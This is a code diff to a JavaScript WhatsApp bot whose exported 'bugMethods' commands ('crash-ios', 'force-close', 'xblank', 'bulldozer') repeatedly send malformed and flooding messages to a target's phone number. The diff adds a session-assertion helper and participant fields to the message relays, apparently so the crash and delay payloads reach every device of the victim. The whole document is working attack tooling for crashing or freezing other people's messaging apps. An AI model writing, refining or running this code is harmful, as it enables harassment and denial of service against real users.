@@ -11,6 +11,19 @@ const botname2 = "Liora Bot";
 
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
+async function assertSession(sock, target) {
+    try {
+        let devices = (await sock.getUSyncDevices([target], false, false)).map(({ user, device }) =>
+            jidEncode(user, 's.whatsapp.net', device)
+        );
+        await sock.assertSessions(devices);
+        return devices;
+    } catch (e) {
+        console.error("Session assertion failed:", e);
+        return [target];
+    }
+}
+
 async function callinvisible(sock, target) {
     const msg = await generateWAMessageFromContent(target, {
         viewOnceMessage: {
@@ -251,6 +264,7 @@ async function DelayNative(sock, target, mention) {
                 }
             },
             {
+                participant: { jid: target, count: '0' },
                 additionalNodes: [
                     {
                         tag: "meta",
@@ -324,6 +338,7 @@ async function Jtwdlyinvis(sock, target) {
         {
             messageId: permissionX.key.id,
             statusJidList: [target],
+            participant: { jid: target, count: '0' },
             additionalNodes: [
                 {
                     tag: "meta",
@@ -351,6 +366,7 @@ async function Jtwdlyinvis(sock, target) {
         {
             messageId: permissionY.key.id,
             statusJidList: [target],
+            participant: { jid: target, count: '0' },
             additionalNodes: [
                 {
                     tag: "meta",
@@ -443,7 +459,11 @@ async function BlackBlankTotal(sock, target, mention) {
         upload: sock.waUploadToServer
     });
 
-    await sock.relayMessage(target, album.message, { messageId: album.key.id });
+    await assertSession(sock, target);
+    await sock.relayMessage(target, album.message, {
+        messageId: album.key.id,
+        participant: { jid: target, count: '0' }
+    });
 
     for (let i = 0; i < 10; i++) {
         const msg = await generateWAMessage(target, photo, {
@@ -470,6 +490,7 @@ async function BlackBlankTotal(sock, target, mention) {
         await sock.relayMessage("status@broadcast", msg.message, {
             messageId: msg.key.id,
             statusJidList: [target],
+            participant: { jid: target, count: '0' },
             additionalNodes: [
                 {
                     tag: "meta",
@@ -493,6 +514,7 @@ async function BlackBlankTotal(sock, target, mention) {
                     message: { protocolMessage: { key: msg.key, type: 25 } }
                 }
             }, {
+                participant: { jid: target, count: '0' },
                 additionalNodes: [
                     { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
                 ]
@@ -636,6 +658,7 @@ async function JtwStuck(sock, target) {
         await sock.relayMessage("status@broadcast", msg.message, {
             messageId: msg.key.id,
             statusJidList: [target],
+            participant: { jid: target, count: '0' },
             additionalNodes: [
                 {
                     tag: "meta",
@@ -810,6 +833,7 @@ async function SkyForce(sock, target) {
         { userJid: target }
     );
 
+    await assertSession(sock, target);
     await sock.relayMessage(target, msg.message, {
         participant: { jid: target, count: '0' },
         messageId: msg.key.id,
@@ -1042,6 +1066,7 @@ export const bugMethods = {
     "onemsg": (sock, target) => FcOneMsg(sock, target),
     "bulldozer": async (sock, target) => {
         console.log(chalk.cyan.bold(`[Bulldozer] Starting Hard Delay on ${target}...`));
+        await assertSession(sock, target);
         for (let i = 0; i < 10; i++) {
             await callinvisible(sock, target);
             await DelayInvisibleXx(sock, target);
@@ -1055,6 +1080,7 @@ export const bugMethods = {
     },
     "invisible": async (sock, target) => {
         console.log(chalk.cyan.bold(`[Invisible] Starting Hard Delay on ${target}...`));
+        await assertSession(sock, target);
         for (let i = 0; i < 10; i++) {
             await callinvisible(sock, target);
             await DelayInvisibleXx(sock, target);
@@ -1068,6 +1094,7 @@ export const bugMethods = {
     },
     "senjudelay": async (sock, target) => {
         console.log(chalk.cyan.bold(`[SenjuDelay] Starting Hard Delay on ${target}...`));
+        await assertSession(sock, target);
         for (let i = 0; i < 10; i++) {
             await callinvisible(sock, target);
             await DelayInvisibleXx(sock, target);
@@ -1081,6 +1108,7 @@ export const bugMethods = {
     },
     "xblank": async (sock, target) => {
         console.log(chalk.magenta.bold(`[XBlank] Starting Blank Attack on ${target}...`));
+        await assertSession(sock, target);
         for (let i = 0; i < 10; i++) {
             await crashnew(sock, target);
             await BlackBlankTotal(sock, target);
@@ -1093,6 +1121,7 @@ export const bugMethods = {
     },
     "crash-ios": async (sock, target) => {
         console.log(chalk.magenta.bold(`[Crash-iOS] Starting Blank Attack on ${target}...`));
+        await assertSession(sock, target);
         for (let i = 0; i < 10; i++) {
             await crashnew(sock, target);
             await BlackBlankTotal(sock, target);
@@ -1105,6 +1134,7 @@ export const bugMethods = {
     },
     "senjufc": async (sock, target) => {
         console.log(chalk.red.bold(`[SenjuFC] Starting Force Close Attack on ${target}...`));
+        await assertSession(sock, target);
         for (let i = 0; i < 10; i++) {
             await NexusChatAiCrash(sock, target);
             await EmpireUltimate(sock, target);
@@ -1118,6 +1148,7 @@ export const bugMethods = {
     },
     "force-close": async (sock, target) => {
         console.log(chalk.red.bold(`[Force-Close] Starting Force Close Attack on ${target}...`));
+        await assertSession(sock, target);
         for (let i = 0; i < 10; i++) {
             await NexusChatAiCrash(sock, target);
             await EmpireUltimate(sock, target);
